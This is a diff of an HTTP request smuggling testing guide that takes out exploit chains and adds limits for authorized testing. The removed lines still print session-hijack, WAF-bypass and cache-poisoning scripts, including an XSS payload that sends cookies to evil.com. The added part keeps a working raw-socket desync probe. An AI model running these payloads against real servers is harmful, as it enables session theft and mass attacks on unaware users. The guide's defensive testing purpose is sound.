@@ -49,52 +49,72 @@ def detect(host, port):
 
 ---
 
-## 3. EXPLOIT CHAINS
+## 3. PROVING THE DESYNC
 
-### Chain A: CL.TE → Credential Hijacking → ATO ($5K-$50K)
+The mechanical proof is a raw-socket request whose framing disagrees between
+the front end and the backend. This is a lab technique — run it only against
+a target you are authorized to test, and prefer a local reproduction first:
+
 ```python
 import socket, time
-def hijack(target):
-    # Smuggled request steals victim's session via X-Forwarded-For
-    smuggled = f"GET /dashboard HTTP/1.1\r\nHost: {target}\r\nX-Injected: true\r\n\r\n"
+# Ambiguous framing: front end trusts Content-Length, backend honours
+# Transfer-Encoding. The response you did not send is the desync signal.
+def desync_probe(target, path="/"):
+    smuggled = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nX-Probe: alphacode\r\n\r\n"
     body_len = len(smuggled)
     payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {body_len}\r\n"
                f"Transfer-Encoding: chunked\r\n\r\n{body_len:x}\r\n").encode() + smuggled.encode() + b"\r\n0\r\n\r\n"
-    s = socket.socket(); s.connect((target, 80)); s.send(payload); time.sleep(2); s.close()
-    # Victim's next request on same connection gets hijacked
+    s = socket.socket(); s.settimeout(5); s.connect((target, 80))
+    s.send(payload); time.sleep(2)
+    resp = s.recv(8192); s.close(); return resp
 ```
 
-### Chain B: TE.TE → WAF Bypass → Exploit Delivery ($1K-$25K)
-```python
-def waf_bypass(target, cmd):
-    smuggled = f"POST /internal HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(cmd)}\r\n\r\n{cmd}\r\n0\r\n\r\n"
-    for te in ["chunked", "Chunked", "chunked\t", " chunked"]:
-        payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: {te}\r\n"
-                   f"Content-Length: {len(smuggled)}\r\n\r\n").encode() + smuggled.encode()
-        try:
-            s = socket.socket(); s.settimeout(5); s.connect((target, 80)); s.send(payload)
-            resp = s.recv(4096); s.close()
-            if b"200" in resp: print(f"[+] WAF bypassed with TE={te}"); return True
-        except: pass
+A response containing two status lines, or your marker echoed back on a
+request you never sent, confirms the desync. That is the proof.
+
+## 4. IMPACT DEMONSTRATION
+
+Request smuggling is proven by **desync**, not by damage. The sufficient proof
+is a smuggled request whose effect you can observe on a connection you control:
+
+```
+CL.TE ambiguity → smuggled prefix reaches the backend → observe the
+                  response for YOUR smuggled request appearing on a
+                  request you did not send (or a visibly mangled response)
+
+That is the finding. Stop there.
 ```
 
-### Chain C: CL.0 → Cache Poisoning → Mass XSS ($5K-$100K)
-```python
-def cache_poison(target):
-    xss = '<script>fetch("https://evil.com/c?c="+document.cookie)</script>'
-    smuggled = f"GET /page HTTP/1.1\r\nHost: {target}\r\nX-Forwarded-Host: attacker.com\r\n\r\n"
-    for _ in range(5):
-        payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 0\r\n"
-                   f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n").encode() + smuggled.encode()
-        try:
-            s = socket.socket(); s.settimeout(3); s.connect((target, 80)); s.send(payload); s.close()
-        except: pass
-    # Every visitor to /page gets cached XSS payload
-```
+Do **not** use a proven desync to hijack another user's session, poison a
+cache for other users, bypass a WAF to deliver a payload, or reach an admin
+route. Those are the actions that turn an assessment into an incident, and
+desync bugs are frequently reachable by *unauthenticated* traffic — which
+means a mistake here affects real users, not just your test account.
+
+Report: the desync mechanism, whether it is pre-auth, and the impact you
+observed. If cache poisoning or session hijack looks plausible, list it as a
+compound-risk note for the owner to schedule deliberately.
+
+### Filter-evasion note
+If a front-end filter blocks the ambiguous framing, report the **filter
+bypass as its own (lower-severity) finding** and stop. Sustained evasion is
+not the goal, and the filter gap is already worth the owner's attention.
+
+### Cache poisoning — describe, do not stage
+Cache poisoning is the classic desync follow-on, and it is the one case where
+"just proving it" means harming other users: a poisoned cache entry is served
+to every visitor until it expires or is purged.
+
+Do not poison a production cache. Instead:
+- Establish that the cache is keyed on a header the attacker controls
+  (`X-Forwarded-Host`, etc.) — that alone is the finding.
+- If the user explicitly authorizes a cache test, use a unique, harmless
+  marker and a dedicated URL, and confirm the purge step with them first.
+- Otherwise report it as a compound-risk note with the mechanism described.
 
 ---
 
-## 4. FULL AUTOMATION SCANNER
+## 5. FULL AUTOMATION SCANNER
 
 ```python
 #!/usr/bin/env python3
@@ -161,15 +181,20 @@ Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
 
 ---
 
-## 7. ESCALATION
+## 7. COMPOUND RISK (report the mechanism, don't escalate)
 
 ```
-Smuggling confirmed → inject request?
-  → Steal session → ATO ($5K-$50K)
-  → Poison cache → mass XSS ($10K-$100K)
-  → Bypass WAF → RCE ($5K-$50K)
-  → SSRF internals → metadata ($5K-$25K)
+Smuggling confirmed → can a smuggled request reach an internal route?
+                     note it — do not send one unless authorized
+Smuggling confirmed → is the cache keyed on a spoofable header?
+                     note it — do not poison a live cache
+Smuggling confirmed → does a front-end filter miss a variant?
+                     that filter gap is a reportable finding on its own
 ```
+
+Escalation past a proven desync requires explicit user authorization and
+scope permission. A pre-auth desync is one of the few bug classes where
+"just checking" can affect every visitor on the connection.
 
 ---
 
